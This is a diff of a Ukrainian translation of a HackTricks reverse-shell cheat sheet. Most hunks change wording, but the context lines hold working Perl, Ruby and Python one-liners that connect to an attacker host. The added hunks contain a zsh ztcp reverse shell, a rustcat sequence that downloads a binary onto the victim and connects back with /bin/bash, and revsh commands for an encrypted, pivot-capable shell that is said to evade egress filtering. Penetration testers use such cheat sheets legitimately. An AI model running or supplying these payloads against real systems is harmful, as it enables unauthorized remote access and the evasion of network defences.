@@ -2,11 +2,11 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-**Якщо у вас є питання щодо будь-якої з цих оболонок, ви можете перевірити їх на** [**https://explainshell.com/**](https://explainshell.com)
+**Якщо у вас є питання щодо будь-яких з цих оболонок, ви можете перевірити їх на** [**https://explainshell.com/**](https://explainshell.com)
 
 ## Full TTY
 
-**Як тільки ви отримаєте зворотну оболонку**[ **прочитайте цю сторінку, щоб отримати повний TTY**](full-ttys.md)**.**
+**Якщо ви отримали зворотну оболонку**[ **прочитайте цю сторінку, щоб отримати повний TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -81,15 +81,15 @@ toboggan -m nix.py -i
 ```
 Щоб безпосередньо використовувати інтерактивну оболонку. Ви можете додати `-b` для інтеграції з Burpsuite і видалити `-i` для більш базового обгортки rce.
 
-Ще одна можливість полягає у використанні реалізації `IppSec` для пересилання оболонки [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
+Ще одна можливість полягає у використанні реалізації вперед оболонки `IppSec` [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 Вам просто потрібно змінити:
 
 - URL вразливого хоста
-- Префікс і суфікс вашого корисного навантаження (якщо є)
-- Спосіб відправки корисного навантаження (заголовки? дані? додаткова інформація?)
+- Префікс і суфікс вашого payload (якщо є)
+- Спосіб відправки payload (заголовки? дані? додаткова інформація?)
 
-Тоді ви можете просто **надсилати команди** або навіть **використовувати команду `upgrade`** для отримання повного PTY (зауважте, що канали читаються і записуються з приблизною затримкою 1,3 с).
+Тоді ви можете просто **надсилати команди** або навіть **використовувати команду `upgrade`** для отримання повного PTY (зверніть увагу, що канали читаються і записуються з приблизною затримкою 1,3 секунди).
 
 ## Netcat
 ```bash
@@ -137,7 +137,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
-## Рубі
+## Ruby
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -219,6 +219,48 @@ or
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 ```
+## Zsh (вбудований TCP)
+```bash
+# Requires no external binaries; leverages zsh/net/tcp module
+zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
+```
+## Rustcat (rcat)
+
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – сучасний прослуховувач, схожий на netcat, написаний на Rust (упакований у Kali з 2024 року).
+```bash
+# Attacker – interactive TLS listener with history & tab-completion
+rcat listen -ib 55600
+
+# Victim – download static binary and connect back with /bin/bash
+curl -L https://github.com/robiot/rustcat/releases/latest/download/rustcat-x86_64 -o /tmp/rcat \
+&& chmod +x /tmp/rcat \
+&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
+```
+Особливості:
+- Додатковий прапорець `--ssl` для зашифрованого транспорту (TLS 1.3)
+- `-s` для запуску будь-якого бінарного файлу (наприклад, `/bin/sh`, `python3`) на жертві
+- `--up` для автоматичного оновлення до повністю інтерактивного PTY
+
+## revsh (зашифрований та готовий до півотування)
+
+`revsh` - це маленький C клієнт/сервер, який забезпечує повний TTY через **зашифрований тунель Діффі-Хеллмана** і може за бажанням підключити **TUN/TAP** інтерфейс для півотування, схожого на VPN.
+```bash
+# Build (or grab a pre-compiled binary from the releases page)
+git clone https://github.com/emptymonkey/revsh && cd revsh && make
+
+# Attacker – controller/listener on 443 with a pinned certificate
+revsh -c 0.0.0.0:443 -key key.pem -cert cert.pem
+
+# Victim – reverse shell over TLS to the attacker
+./revsh <ATTACKER-IP>:443
+```
+Корисні прапори:
+- `-b` : bind-shell замість reverse
+- `-p socks5://127.0.0.1:9050` : проксі через TOR/HTTP/SOCKS
+- `-t` : створити TUN інтерфейс (reverse VPN)
+
+Оскільки вся сесія зашифрована та мультиплексована, вона часто обходить просте фільтрування виходу, яке б знищило plain-text `/dev/tcp` shell.
+
 ## OpenSSL
 
 Атакуючий (Kali)
@@ -318,5 +360,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 - [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
 - [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+- [https://github.com/robiot/rustcat](https://github.com/robiot/rustcat)
+- [https://github.com/emptymonkey/revsh](https://github.com/emptymonkey/revsh)
 
 {{#include ../../banners/hacktricks-training.md}}
